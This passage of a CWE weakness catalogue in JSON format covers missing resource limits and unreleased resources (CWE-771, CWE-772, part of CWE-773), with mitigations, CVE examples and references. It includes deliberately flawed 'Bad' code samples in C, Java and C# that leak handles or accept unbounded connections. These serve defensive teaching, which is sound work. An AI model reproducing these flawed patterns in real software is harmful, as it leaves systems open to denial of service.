        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nMitigation of resource exhaustion attacks requires that the target system either:\n\n\n  - recognizes the attack and denies that user further access for a given amount of time, typically by using increasing time delays\n\n  - uniformly throttles all requests in order to make it more difficult to consume resources more quickly than they can again be freed.\n\nThe first of these solutions is an issue in itself though, since it may allow attackers to prevent the use of the system by a particular valid user. If the attacker impersonates the valid user, they may be able to prevent the user from accessing the server in question.\n\nThe second solution can be difficult to effectively institute -- and even when properly done, it does not provide a full solution. It simply requires more resources on the part of the attacker.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Ensure that protocols have specific limits of scale placed on them."
        },
        {
          "MitigationID": "MIT-38.1",
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "\n\nIf the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery.\n\n\nEnsure that all failures in resource allocation place the system into a safe posture.\n"
        },
        {
          "MitigationID": "MIT-47",
          "Phase": [
            "Operation",
            "Architecture and Design"
          ],
          "Strategy": "Resource Limitation",
          "Description": "\n\nUse resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.\n\n\nWhen the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.\n\n\nEnsure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).\n"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-25",
          "Entries": [
            {
              "IntroText": "This code allocates a socket and forks each time it receives a new connection."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tsock=socket(AF_INET, SOCK_STREAM, 0);\n\twhile (1) {\n\t\tnewsock=accept(sock, ...);\n\t\tprintf(\"A connection has been accepted\\n\");\n\t\tpid = fork();\n\t}\n```"
            },
            {
              "BodyText": "The program does not track how many connections have been made, and it does not limit the number of connections. Because forking is a relatively expensive operation, an attacker would be able to cause the system to run out of CPU, processes, or memory by making a large number of connections. Alternatively, an attacker could consume all available connections, preventing others from accessing the system remotely."
            }
          ]
        },
        {
          "ID": "DX-50",
          "Entries": [
            {
              "IntroText": "In the following example a server socket connection is used to accept a request to store data on the local file system using a specified filename. The method openSocketConnection establishes a server socket to accept requests from a client. When a client establishes a connection to this service the getNextMessage method is first used to retrieve from the socket the name of the file to store the data, the openFileToWrite method will validate the filename and open a file to write to on the local file system. The getNextMessage is then used within a while loop to continuously read data from the socket and output the data to the file until there is no longer any data from the socket."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint writeDataFromSocketToFile(char *host, int port)\n\t{\n\t\t\tchar filename[FILENAME_SIZE];\n\t\t\tchar buffer[BUFFER_SIZE];\n\t\t\tint socket = openSocketConnection(host, port);\n\t\t\tif (socket < 0) {\n\t\t\t\tprintf(\"Unable to open socket connection\");\n\t\t\t\treturn(FAIL);\n\t\t\t}\n\t\t\tif (getNextMessage(socket, filename, FILENAME_SIZE) > 0) {\n\t\t\t\t\tif (openFileToWrite(filename) > 0) {\n\t\t\t\t\t\t\twhile (getNextMessage(socket, buffer, BUFFER_SIZE) > 0){\n\t\t\t\t\t\t\t\tif (!(writeToFile(buffer) > 0))\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tcloseFile();\n\t\t\t}\n\t\t\tcloseSocket(socket);\n\t}\n```"
            },
            {
              "BodyText": "This example creates a situation where data can be dumped to a file on the local file system without any limits on the size of the file. This could potentially exhaust file or disk resources and/or limit other clients' ability to access the service."
            }
          ]
        },
        {
          "ID": "DX-51",
          "Entries": [
            {
              "IntroText": "In the following example, the processMessage method receives a two dimensional character array containing the message to be processed. The two-dimensional character array contains the length of the message in the first character array and the message body in the second character array. The getMessageLength method retrieves the integer value of the length from the first character array. After validating that the message length is greater than zero, the body character array pointer points to the start of the second character array of the two-dimensional character array and memory is allocated for the new body character array."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n```\n/* process message accepts a two-dimensional character array of the form [length][body] containing the message to be processed */* \n\tint processMessage(char **message)\n\t{\n\t```\n\t\t\tchar *body;\n\t\t\tint length = getMessageLength(message[0]);\n\t\t\tif (length > 0) {\n\t\t\t\tbody = &message[1][0];\n\t\t\t\tprocessMessageBody(body);\n\t\t\t\treturn(SUCCESS);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprintf(\"Unable to process message; invalid message length\");\n\t\t\t\treturn(FAIL);\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "This example creates a situation where the length of the body character array can be very large and will consume excessive memory, exhausting system resources. This can be avoided by restricting the length of the second character array with a maximum length check"
            },
            {
              "BodyText": "Also, consider changing the type from 'int' to 'unsigned int', so that you are always guaranteed that the number is positive. This might not be possible if the protocol specifically requires allowing negative values, or if you cannot control the return value from getMessageLength(), but it could simplify the check to ensure the input is positive, and eliminate other errors such as signed-to-unsigned conversion errors (CWE-195) that may occur elsewhere in the code."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\tunsigned int length = getMessageLength(message[0]);\n\tif ((length > 0) && (length < MAX_LENGTH)) {...}\n```"
            }
          ]
        },
        {
          "ID": "DX-52",
          "Entries": [
            {
              "IntroText": "In the following example, a server object creates a server socket and accepts client connections to the socket. For every client connection to the socket a separate thread object is generated using the ClientSocketThread class that handles request made by the client through the socket."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic void acceptConnections() {\n\t\t\ttry {\n\t\t\t\tServerSocket serverSocket = new ServerSocket(SERVER_PORT);\n\t\t\t\tint counter = 0;\n\t\t\t\tboolean hasConnections = true;\n\t\t\t\twhile (hasConnections) {\n\t\t\t\t\tSocket client = serverSocket.accept();\n\t\t\t\t\tThread t = new Thread(new ClientSocketThread(client));\n\t\t\t\t\tt.setName(client.getInetAddress().getHostName() + \":\" + counter++);\n\t\t\t\t\tt.start();\n\t\t\t\t}\n\t\t\t\tserverSocket.close();\n\t\t\t} catch (IOException ex) {...}\n\t}\n```"
            },
            {
              "BodyText": "In this example there is no limit to the number of client connections and client threads that are created. Allowing an unlimited number of client connections and threads could potentially overwhelm the system and system resources."
            },
            {
              "BodyText": "The server should limit the number of client connections and the client threads that are created. This can be easily done by creating a thread pool object that limits the number of threads that are generated."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic static final int SERVER_PORT = 4444;\n\tpublic static final int MAX_CONNECTIONS = 10;\n\t...\n\tpublic void acceptConnections() {\n\t\t\ttry {\n\t\t\t\tServerSocket serverSocket = new ServerSocket(SERVER_PORT);\n\t\t\t\tint counter = 0;\n\t\t\t\tboolean hasConnections = true;\n\t\t\t\twhile (hasConnections) {\n\t\t\t\t\thasConnections = checkForMoreConnections();\n\t\t\t\t\tSocket client = serverSocket.accept();\n\t\t\t\t\tThread t = new Thread(new ClientSocketThread(client));\n\t\t\t\t\tt.setName(client.getInetAddress().getHostName() + \":\" + counter++);\n\t\t\t\t\tExecutorService pool = Executors.newFixedThreadPool(MAX_CONNECTIONS);\n\t\t\t\t\tpool.execute(t);\n\t\t\t\t}\n\t\t\t\tserverSocket.close();\n\t\t\t} catch (IOException ex) {...}\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "An unnamed web site allowed a user to purchase tickets for an event. A menu option allowed the user to purchase up to 10 tickets, but the back end did not restrict the actual number of tickets that could be purchased."
            },
            {
              "Reference": "REF-667"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "Here the problem is that every time a connection is made, more memory is allocated. So if one just opened up more and more connections, eventually the machine would run out of memory."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tbar connection() {\n\t\tfoo = malloc(1024);\n\t\treturn foo;\n\t}\n\tendConnection(bar foo) {\n\t\tfree(foo);\n\t}\n\tint main() {\n\t\twhile(1) {\n\t\t\tfoo=connection();\n\t\t}\n\t\tendConnection(foo)\n\t}\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-21668",
          "Description": "Chain: Python library does not limit the resources used to process images that specify a very large number of bands (CWE-1284), leading to excessive memory consumption (CWE-789) or an integer overflow (CWE-190).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-21668"
        },
        {
          "Reference": "CVE-2009-4017",
          "Description": "Language interpreter does not restrict the number of temporary files being created when handling a MIME request with a large number of parts..",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-4017"
        },
        {
          "Reference": "CVE-2009-2726",
          "Description": "Driver does not use a maximum width when invoking sscanf style functions, causing stack consumption.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2726"
        },
        {
          "Reference": "CVE-2009-2540",
          "Description": "Large integer value for a length property in an object causes a large amount of memory allocation.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2540"
        },
        {
          "Reference": "CVE-2009-2054",
          "Description": "Product allows exhaustion of file descriptors when processing a large number of TCP packets.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2054"
        },
        {
          "Reference": "CVE-2008-5180",
          "Description": "Communication product allows memory consumption with a large number of SIP requests, which cause many sessions to be created.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5180"
        },
        {
          "Reference": "CVE-2008-1700",
          "Description": "Product allows attackers to cause a denial of service via a large number of directives, each of which opens a separate window.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1700"
        },
        {
          "Reference": "CVE-2005-4650",
          "Description": "CMS does not restrict the number of searches that can occur simultaneously, leading to resource exhaustion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-4650"
        },
        {
          "Reference": "CVE-2020-15100",
          "Description": "web application scanner attempts to read an excessively large file created by a user, causing process termination",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-15100"
        },
        {
          "Reference": "CVE-2020-7218",
          "Description": "Go-based workload orchestrator does not limit resource usage with unauthenticated connections, allowing a DoS by flooding the service",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-7218"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "FIO04-J",
          "EntryName": "Close resources when they are no longer needed"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "SER12-J",
          "EntryName": "Avoid memory and resource leaks during serialization"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "MSC05-J",
          "EntryName": "Do not exhaust heap space"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-2",
          "EntryName": "Req CR 7.2"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-2",
          "EntryName": "Req CR 2.7"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SI-1"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SI-2"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 3-3",
          "EntryName": "Req SR 7.2"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 3-3",
          "EntryName": "Req SR 2.7"
        }
      ],
      "RelatedAttackPatterns": [
        "125",
        "130",
        "147",
        "197",
        "229",
        "230",
        "231",
        "469",
        "482",
        "486",
        "487",
        "488",
        "489",
        "490",
        "491",
        "493",
        "494",
        "495",
        "496",
        "528"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-386",
          "Authors": [
            "Joao Antunes",
            "Nuno Ferreira Neves",
            "Paulo Verissimo"
          ],
          "Title": "Detection and Prediction of Resource-Exhaustion Vulnerabilities",
          "Publication": "Proceedings of the IEEE International Symposium on Software Reliability Engineering (ISSRE)",
          "PublicationYear": "2008",
          "PublicationMonth": "11",
          "URL": "http://homepages.di.fc.ul.pt/~nuno/PAPERS/ISSRE08.pdf"
        },
        {
          "ExternalReferenceID": "REF-387",
          "Authors": [
            "D.J. Bernstein"
          ],
          "Title": "Resource exhaustion",
          "URL": "http://cr.yp.to/docs/resources.html"
        },
        {
          "ExternalReferenceID": "REF-388",
          "Authors": [
            "Pascal Meunier"
          ],
          "Title": "Resource exhaustion",
          "Publication": "Secure Programming Educational Material",
          "PublicationYear": "2004",
          "URL": "http://homes.cerias.purdue.edu/~pmeunier/secprog/sanitized/class1/6.resource%20exhaustion.ppt"
        },
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 17, \"Protecting Against Denial of Service Attacks\" Page 517",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-667",
          "Authors": [
            "Rafal Los"
          ],
          "Title": "Real-Life Example of a 'Business Logic Defect' (Screen Shots!)",
          "PublicationYear": "2011",
          "URL": "http://h30501.www3.hp.com/t5/Following-the-White-Rabbit-A/Real-Life-Example-of-a-Business-Logic-Defect-Screen-Shots/ba-p/22581"
        },
        {
          "ExternalReferenceID": "REF-672",
          "Authors": [
            "Frank Kim"
          ],
          "Title": "Top 25 Series - Rank 22 - Allocation of Resources Without Limits or Throttling",
          "PublicationYear": "2010",
          "PublicationMonth": "03",
          "PublicationDay": "23",
          "Publisher": "SANS Software Security Institute",
          "URL": "https://web.archive.org/web/20170113055136/https://software-security.sans.org/blog/2010/03/23/top-25-series-rank-22-allocation-of-resources-without-limits-or-throttling/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 10, \"Resource Limits\", Page 574",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This entry is different from uncontrolled resource consumption (CWE-400) in that there are other weaknesses that are related to inability to control resource consumption, such as holding on to a resource too long after use, or not correctly keeping track of active resources so that they can be managed and released when they are finished (CWE-771)."
        },
        {
          "Type": "Theoretical",
          "Note": "Vulnerability theory is largely about how behaviors and resources interact. \"Resource exhaustion\" can be regarded as either a consequence or an attack, depending on the perspective. This entry is an attempt to reflect one of the underlying weaknesses that enable these attacks (or consequences) to take place."
        }
      ]
    },
    {
      "ID": "771",
      "Name": "Missing Reference to Active Allocated Resource",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not properly maintain a reference to a resource that has been allocated, which prevents the resource from being reclaimed.",
      "ExtendedDescription": "This does not necessarily apply in languages or frameworks that automatically perform garbage collection, since the removal of all references may act as a signal that the resource is ready to be reclaimed.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "400",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (Other)"
          ],
          "Note": "An attacker that can influence the allocation of resources that are not properly maintained could deplete the available resource pool and prevent all other processes from accessing the same type of resource."
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-47",
          "Phase": [
            "Operation",
            "Architecture and Design"
          ],
          "Strategy": "Resource Limitation",
          "Description": "\n\nUse resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.\n\n\nWhen the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.\n\n\nEnsure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).\n"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO42-C",
          "EntryName": "Close files when they are no longer needed",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM31-C",
          "EntryName": "Free dynamically allocated memory when no longer needed",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP14",
          "EntryName": "Failure to Release Resource"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 3-3",
          "EntryName": "Req SR 7.2"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SVV-1"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-2",
          "EntryName": "Req CR 7.2"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "772",
      "Name": "Missing Release of Resource after Effective Lifetime",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not release a resource after its effective lifetime has ended, i.e., after the resource is no longer needed.",
      "ExtendedDescription": "When a resource is not released after use, it can allow attackers to cause a denial of service by causing the allocation of resources without triggering their release. Frequently-affected resources include memory, CPU, disk space, power or battery, etc.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (Other)"
          ],
          "Note": "An attacker that can influence the allocation of resources that are not properly released could deplete the available resource pool and prevent all other processes from accessing the same type of resource."
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-3",
          "Phase": [
            "Requirements"
          ],
          "Strategy": "Language Selection",
          "Description": "\n\nUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, languages such as Java, Ruby, and Lisp perform automatic garbage collection that releases memory for objects that have been deallocated.\n"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "It is good practice to be responsible for freeing all resources you allocate and to be consistent with how and where you free resources in a function. If you allocate resources that you intend to free upon completion of the function, you must be sure to free the resources at all exit points for that function including error conditions."
        },
        {
          "MitigationID": "MIT-47",
          "Phase": [
            "Operation",
            "Architecture and Design"
          ],
          "Strategy": "Resource Limitation",
          "Description": "\n\nUse resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.\n\n\nWhen the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.\n\n\nEnsure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).\n"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-81",
          "Entries": [
            {
              "IntroText": "The following method never closes the new file handle. Given enough time, the Finalize() method for BufferReader should eventually call Close(), but there is no guarantee as to how long this action will take. In fact, there is no guarantee that Finalize() will ever be invoked. In a busy environment, the Operating System could use up all of the available file handles before the Close() function is called."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate void processFile(string fName)\n\t{\n\t\tBufferReader fil = new BufferReader(new FileReader(fName));\n\t\tString line;\n\t\twhile ((line = fil.ReadLine()) != null)\n\t\t{\n\t\t\tprocessLine(line);\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "The good code example simply adds an explicit call to the Close() function when the system is done using the file. Within a simple example such as this the problem is easy to see and fix. In a real system, the problem may be considerably more obscure."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate void processFile(string fName)\n\t{\n\t\tBufferReader fil = new BufferReader(new FileReader(fName));\n\t\tString line;\n\t\twhile ((line = fil.ReadLine()) != null)\n\t\t{\n\t\t\tprocessLine(line);\n\t\t}\n\t\tfil.Close();\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following code attempts to open a new connection to a database, process the results returned by the database, and close the allocated SqlConnection object."
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\tSqlConnection conn = new SqlConnection(connString);\n\tSqlCommand cmd = new SqlCommand(queryString);\n\tcmd.Connection = conn;\n\tconn.Open();\n\tSqlDataReader rdr = cmd.ExecuteReader();\n\tHarvestResults(rdr);\n\tconn.Connection.Close();\n```"
            },
            {
              "BodyText": "The problem with the above code is that if an exception occurs while executing the SQL or processing the results, the SqlConnection object is not closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries."
            }
          ]
        },
        {
          "ID": "DX-82",
          "Entries": [
            {
              "IntroText": "This code attempts to open a connection to a database and catches any exceptions that may occur."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\ttry {\n\t\tConnection con = DriverManager.getConnection(some_connection_string);\n\t}\n\tcatch ( Exception e ) {\n\t\tlog( e );\n\t}\n```"
            },
            {
              "BodyText": "If an exception occurs after establishing the database connection and before the same connection closes, the pool of database connections may become exhausted. If the number of available connections is exceeded, other users cannot access this resource, effectively denying access to the application."
            }
          ]
        },
        {
          "ID": "DX-83",
          "Entries": [
            {
              "IntroText": "Under normal conditions the following C# code executes a database query, processes the results returned by the database, and closes the allocated SqlConnection object. But if an exception occurs while executing the SQL or processing the results, the SqlConnection object is not closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries."
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\t...\n\tSqlConnection conn = new SqlConnection(connString);\n\tSqlCommand cmd = new SqlCommand(queryString);\n\tcmd.Connection = conn;\n\tconn.Open();\n\tSqlDataReader rdr = cmd.ExecuteReader();\n\tHarvestResults(rdr);\n\tconn.Connection.Close();\n\t...\n```"
            }
          ]
        },
        {
          "ID": "DX-84",
          "Entries": [
            {
              "IntroText": "The following C function does not close the file handle it opens if an error occurs. If the process is long-lived, the process can run out of file handles."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint decodeFile(char* fName) {\n\t\t\tchar buf[BUF_SZ];\n\t\t\tFILE* f = fopen(fName, \"r\");\n\t\t\tif (!f) {\n\t\t\t\tprintf(\"cannot open %s\\n\", fName);\n\t\t\t\treturn DECODE_FAIL;\n\t\t\t}\n\t\t\telse {\n\t\t\t\t\twhile (fgets(buf, BUF_SZ, f)) {\n\t\t\t\t\t\tif (!checkChecksum(buf)) {\n\t\t\t\t\t\t\treturn DECODE_FAIL;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\tdecodeBlock(buf);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t}\n\t\t\tfclose(f);\n\t\t\treturn DECODE_SUCCESS;\n\t}\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-0897",
          "Description": "Chain: anti-virus product encounters a malformed file but returns from a function without closing a file descriptor (CWE-775) leading to file descriptor consumption (CWE-400) and failed scans.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0897"
        },
        {
          "Reference": "CVE-2001-0830",
          "Description": "Sockets not properly closed when attacker repeatedly connects and disconnects from server.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0830"
        },
        {
          "Reference": "CVE-1999-1127",
          "Description": "Does not shut down named pipe connections if malformed data is sent.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-1999-1127"
        },
        {
          "Reference": "CVE-2009-2858",
          "Description": "Chain: memory leak (CWE-404) leads to resource exhaustion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2858"
        },
        {
          "Reference": "CVE-2009-2054",
          "Description": "Product allows exhaustion of file descriptors when processing a large number of TCP packets.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2054"
        },
        {
          "Reference": "CVE-2008-2122",
          "Description": "Port scan triggers CPU consumption with processes that attempt to read data from closed sockets.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2122"
        },
        {
          "Reference": "CVE-2007-4103",
          "Description": "Product allows resource exhaustion via a large number of calls that do not complete a 3-way handshake.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4103"
        },
        {
          "Reference": "CVE-2002-1372",
          "Description": "Chain: Return values of file/socket operations are not checked (CWE-252), allowing resultant consumption of file descriptors (CWE-772).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1372"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO42-C",
          "EntryName": "Close files when they are no longer needed",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM31-C",
          "EntryName": "Free dynamically allocated memory when no longer needed",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "OMG ASCSM",
          "EntryID": "ASCSM-CWE-772"
        },
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-CWE-772"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP14",
          "EntryName": "Failure to Release Resource"
        }
      ],
      "RelatedAttackPatterns": [
        "469"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-CWE-772",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        },
        {
          "ExternalReferenceID": "REF-962",
          "Section": "ASCSM-CWE-772",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Security Measure (ASCSM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCSM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "\"Resource exhaustion\" (CWE-400) is currently treated as a weakness, although it is more like a category of weaknesses that all have the same type of consequence. While this entry treats CWE-400 as a parent in view 1000, the relationship is probably more appropriately described as a chain."
        },
        {
          "Type": "Theoretical",
          "Note": "Vulnerability theory is largely about how behaviors and resources interact. \"Resource exhaustion\" can be regarded as either a consequence or an attack, depending on the perspective. This entry is an attempt to reflect one of the underlying weaknesses that enable these attacks (or consequences) to take place."
        }
      ]
    },
    {
      "ID": "773",
      "Name": "Missing Reference to Active File Descriptor or Handle",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not properly maintain references to a file descriptor or handle, which prevents that file descriptor/handle from being reclaimed.",
      "ExtendedDescription": "This can cause the product to consume all available file descriptors or handles, which can prevent other processes from performing critical file processing operations.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "771",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (Other)"
          ],
          "Note": "An attacker that can influence the allocation of resources that are not properly maintained could deplete the available resource pool and prevent all other processes from accessing the same type of resource."
